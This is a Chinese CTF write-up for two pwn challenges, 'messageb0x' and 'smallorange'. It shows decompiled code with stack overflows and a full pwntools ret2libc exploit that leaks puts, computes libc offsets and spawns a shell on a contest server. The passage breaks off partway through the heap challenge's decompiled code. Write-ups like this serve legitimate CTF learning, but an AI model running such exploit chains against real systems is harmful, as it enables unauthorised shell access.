好久没打安恒杯的月赛，此次12月的月赛只有两道pwn题，本着复习累了看看pwn题的心态，结果为了复现第二题荒废复习时间，真香啊，期末挂科预定了Orz
第一题是栈溢出的漏洞，第二题的堆的漏洞
难度相差了个银河系
# messageb0x
保护机制如下：
    Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
只开了个nx，32位的程序
这题的漏洞点主要在这两个函数：
    int process_info()
    {
      char v1; // [esp+0h] [ebp-58h]
      char v2; // [esp+32h] [ebp-26h]
      char s; // [esp+46h] [ebp-12h]
      puts("--> Plz tell me who you are:");
      fgets(&s, 0xA, stdin);
      printf("--> hello %s", &s);
      puts("--> Plz tell me your email address:");
      fgets(&v2, 0x14, stdin);
      puts("--> Plz tell me what do you want to say:");
      fgets(&v1, 0xC8, stdin);//此处栈溢出
      puts("--> Here is your info:");
      puts(&v1);
      return puts("--> Thank you !");
    }
    char *jumper()
    {
      char s; // [esp+Ch] [ebp-1Ch]
      puts("Do you know the libc version?");
      return gets(&s);//此处栈溢出
    }
思路很简单
由于存在栈溢出，那么就只需要分三步走：
  * 泄漏出puts真实地址从而得到libc偏移
  * 跳到jumper函数，再次栈溢出
  * 通过得到的system函数和参数的地址，执行getshell
exp如下：
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./messageb0x"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    if sys.argv[1] == "r":
        libc = ELF("./libc6-i386.so")
        p = remote("101.71.29.5",10009)
    elif sys.argv[1] == "l":
        libc = elf.libc
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc():
        return p.recv()
    def sp():
        print "---------暂停中---------"
        return raw_input()
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(p,a,s):
        return p.sendafter(a,s)
    def getshell():
        p.interactive()
    #-------------------------------------    main = 0x08049386
    jump =0x0804934d
    puts_plt =elf.plt["puts"]
    puts_got =elf.got["puts"]
    payload = "a"*(0x58+4)+p32(puts_plt)+p32(jump)+p32(puts_got)
    sla(p,"--> Plz tell me who you are:\n","aaaa")
    sla(p,"--> Plz tell me your email address:\n","aaaa")
    sla(p,"--> Plz tell me what do you want to say:\n",payload)
    ru("--> Thank you !\n")
    puts= u32(p.recv(4))
    print "puts--------->",hex(puts)#通过puts真实地址去libcdatabase查询偏移
    libc_base = puts- 0x05f140#远程端的libc偏移
    print "libc_base--------->",hex(libc_base)
    system = libc_base+0x03a940#远程端的libc偏移
    binsh = libc_base+0x15902b#远程端的libc偏移
    one = libc_base +0x35938#远程端的libc偏移
    payload = "a"*(0x1c+4)+p32(system)+p32(0)+p32(binsh)
    sla(p,"Do you know the libc version?\n",payload)
    getshell()
这题的libc偏移需要在[libcdatabase](https://libc.blukat.me/)里面去找，本地和远程端是不一样的
# smallorange
看到这题目名，大概就能猜到很可能是house of orange的操作了
然而比赛的时候还是没有搞出这题，赛后复现的时候终于搞懂了
这题的确是骚，学了一波操作
64位，开nx和canary
    Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
进IDA看逻辑：
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      void *v3; // rax
      int v4; // eax
      int v5; // [rsp+8h] [rbp-48h]
      int v6; // [rsp+Ch] [rbp-44h]
      char s; // [rsp+10h] [rbp-40h]
      int *v8; // [rsp+38h] [rbp-18h]
      unsigned __int64 v9; // [rsp+48h] [rbp-8h]
      v9 = __readfsqword(0x28u);
      alarm(0x3Cu);
      v5 = 0xA0;//初始设定为0xa0
      v8 = (&v5 + 1);
      memset(&s, 0, 0x28uLL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stdin, 0LL, 2, 0LL);
      puts("hahaha,come to hurt by ourselves");
      getname(&s);                                  // 格式化字符串泄漏，最多6个字符
      v3 = malloc(0x100uLL);
      printf("\nheap addr:%p\n", v3);
      while ( 1 )
      {
        write(1, "1:new\n2:old\n", 0xCuLL);
        write(1, "choice: ", 8uLL);
        v4 = getnum();
        v6 = v4;
        if ( v4 == 1 )
        {
          new(&v5);                                 // 读入0xa0个字节
        }
        else if ( v4 == 2 )
        {
          out();
        }
      }
    }
    -----------------------------------------------    int __fastcall getname(void *a1)
    {
      signed int i; // [rsp+1Ch] [rbp-4h]
      read(0, a1, 0x28uLL);
      for ( i = 0; i 